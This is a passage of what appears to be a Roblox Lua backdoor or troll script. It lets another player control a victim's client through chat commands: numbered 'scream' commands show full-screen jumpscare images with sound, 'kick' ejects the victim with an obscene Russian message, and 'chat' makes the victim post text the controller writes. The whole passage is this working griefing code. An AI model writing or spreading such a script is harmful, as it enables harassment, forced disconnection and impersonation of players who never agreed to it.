                    print("Scream3 effect ended")
                else
                    print("Scream3 failed: Player character not found")
                end
            elseif msg == "scream4" then
                if LocalPlayer.Character then
                    local screamGui = Instance.new("ScreenGui")
                    screamGui.Name = "Scream4Gui"
                    screamGui.Parent = LocalPlayer.PlayerGui
                    screamGui.IgnoreGuiInset = true
                    screamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    screamGui.ZIndex = 100
                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Position = UDim2.new(0, 0, 0, 0)
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Image = "rbxassetid://9182757465"
                    imageLabel.ZIndex = 100
                    imageLabel.Parent = screamGui
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://9182757465"
                    sound.Volume = 1
                    sound.Parent = screamGui
                    sound:Play()
                    print("Scream4 effect applied by " .. player.Name)
                    wait(5)
                    sound:Stop()
                    screamGui:Destroy()
                    print("Scream4 effect ended")
                else
                    print("Scream4 failed: Player character not found")
                end
            elseif msg == "scream5" then
                if LocalPlayer.Character then
                    local screamGui = Instance.new("ScreenGui")
                    screamGui.Name = "Scream5Gui"
                    screamGui.Parent = LocalPlayer.PlayerGui
                    screamGui.IgnoreGuiInset = true
                    screamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    screamGui.ZIndex = 100
                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Position = UDim2.new(0, 0, 0, 0)
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Image = "rbxassetid://12623079242"
                    imageLabel.ZIndex = 100
                    imageLabel.Parent = screamGui
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://12623079242"
                    sound.Volume = 1
                    sound.Parent = screamGui
                    sound:Play()
                    print("Scream5 effect applied by " .. player.Name)
                    wait(5)
                    sound:Stop()
                    screamGui:Destroy()
                    print("Scream5 effect ended")
                else
                    print("Scream5 failed: Player character not found")
                end
            elseif msg == "scream6" then
                if LocalPlayer.Character then
                    local screamGui = Instance.new("ScreenGui")
                    screamGui.Name = "Scream6Gui"
                    screamGui.Parent = LocalPlayer.PlayerGui
                    screamGui.IgnoreGuiInset = true
                    screamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    screamGui.ZIndex = 100
                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Position = UDim2.new(0, 0, 0, 0)
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Image = "rbxassetid://10246439168"
                    imageLabel.ZIndex = 100
                    imageLabel.Parent = screamGui
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://10246439168"
                    sound.Volume = 1
                    sound.Parent = screamGui
                    sound:Play()
                    print("Scream6 effect applied by " .. player.Name)
                    wait(5)
                    sound:Stop()
                    screamGui:Destroy()
                    print("Scream6 effect ended")
                else
                    print("Scream6 failed: Player character not found")
                end
            elseif msg == "scream7" then
                if LocalPlayer.Character then
                    local screamGui = Instance.new("ScreenGui")
                    screamGui.Name = "Scream7Gui"
                    screamGui.Parent = LocalPlayer.PlayerGui
                    screamGui.IgnoreGuiInset = true
                    screamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    screamGui.ZIndex = 100
                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Position = UDim2.new(0, 0, 0, 0)
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Image = "rbxassetid://10246338786"
                    imageLabel.ZIndex = 100
                    imageLabel.Parent = screamGui
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://10246338786"
                    sound.Volume = 1
                    sound.Parent = screamGui
                    sound:Play()
                    print("Scream7 effect applied by " .. player.Name)
                    wait(5)
                    sound:Stop()
                    screamGui:Destroy()
                    print("Scream7 effect ended")
                else
                    print("Scream7 failed: Player character not found")
                end
            elseif msg == "scream8" then
                if LocalPlayer.Character then
                    local screamGui = Instance.new("ScreenGui")
                    screamGui.Name = "Scream8Gui"
                    screamGui.Parent = LocalPlayer.PlayerGui
                    screamGui.IgnoreGuiInset = true
                    screamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    screamGui.ZIndex = 100
                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Position = UDim2.new(0, 0, 0, 0)
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Image = "rbxassetid://11648246803"
                    imageLabel.ZIndex = 100
                    imageLabel.Parent = screamGui
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://11648246803"
                    sound.Volume = 1
                    sound.Parent = screamGui
                    sound:Play()
                    print("Scream8 effect applied by " .. player.Name)
                    wait(5)
                    sound:Stop()
                    screamGui:Destroy()
                    print("Scream8 effect ended")
                else
                    print("Scream8 failed: Player character not found")
                end
            elseif msg == "scream9" then
                if LocalPlayer.Character then
                    local screamGui = Instance.new("ScreenGui")
                    screamGui.Name = "Scream9Gui"
                    screamGui.Parent = LocalPlayer.PlayerGui
                    screamGui.IgnoreGuiInset = true
                    screamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    screamGui.ZIndex = 100
                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Position = UDim2.new(0, 0, 0, 0)
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Image = "rbxassetid://11587987222"
                    imageLabel.ZIndex = 100
                    imageLabel.Parent = screamGui
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://11587987222"
                    sound.Volume = 1
                    sound.Parent = screamGui
                    sound:Play()
                    print("Scream9 effect applied by " .. player.Name)
                    wait(5)
                    sound:Stop()
                    screamGui:Destroy()
                    print("Scream9 effect ended")
                else
                    print("Scream9 failed: Player character not found")
                end
            elseif msg == "scream10" then
                if LocalPlayer.Character then
                    local screamGui = Instance.new("ScreenGui")
                    screamGui.Name = "Scream10Gui"
                    screamGui.Parent = LocalPlayer.PlayerGui
                    screamGui.IgnoreGuiInset = true
                    screamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    screamGui.ZIndex = 100
                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Position = UDim2.new(0, 0, 0, 0)
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Image = "rbxassetid://12469870004"
                    imageLabel.ZIndex = 100
                    imageLabel.Parent = screamGui
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://12469870004"
                    sound.Volume = 1
                    sound.Parent = screamGui
                    sound:Play()
                    print("Scream10 effect applied by " .. player.Name)
                    wait(5)
                    sound:Stop()
                    screamGui:Destroy()
                    print("Scream10 effect ended")
                else
                    print("Scream10 failed: Player character not found")
                end
            elseif msg == "scream11" then
                if LocalPlayer.Character then
                    local screamGui = Instance.new("ScreenGui")
                    screamGui.Name = "Scream11Gui"
                    screamGui.Parent = LocalPlayer.PlayerGui
                    screamGui.IgnoreGuiInset = true
                    screamGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    screamGui.ZIndex = 100
                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Position = UDim2.new(0, 0, 0, 0)
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Image = "rbxassetid://7273829854"
                    imageLabel.ZIndex = 100
                    imageLabel.Parent = screamGui
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://7273829854"
                    sound.Volume = 1
                    sound.Parent = screamGui
                    sound:Play()
                    print("Scream11 effect applied by " .. player.Name)
                    wait(5)
                    sound:Stop()
                    screamGui:Destroy()
                    print("Scream11 effect ended")
                else
                    print("Scream11 failed: Player character not found")
                end
            elseif msg == "kick" then
                local success, errorMessage = pcall(function()
                    LocalPlayer:Kick("пошел нахуй")
                end)
                if success then
                    print("Player kicked by " .. player.Name .. " via 'kick'")
                else
                    print("Kick failed: " .. tostring(errorMessage))
                end
            elseif msg:sub(1, 5) == "chat " then
                local chatMessage = message:sub(6)
                if chatMessage ~= "" then
                    local success, errorMessage = pcall(function()
                        LocalPlayer:Chat(chatMessage)
                    end)
                    if success then
                        print("Player sent chat message: " .. chatMessage .. " by " .. player.Name)
                    else
                        print("Chat failed: " .. tostring(errorMessage))
                    end
                else
                    print("Chat failed: No message provided after 'chat' command")
                end
            else
                print("Message from " .. player.Name .. ": " .. message)
            end
        end
    end)
end

-- Отладка: проверка TextChatService
print("TextChatService is enabled: " .. tostring(TextChatService.ChatVersion == Enum.ChatVersion.TextChatService))
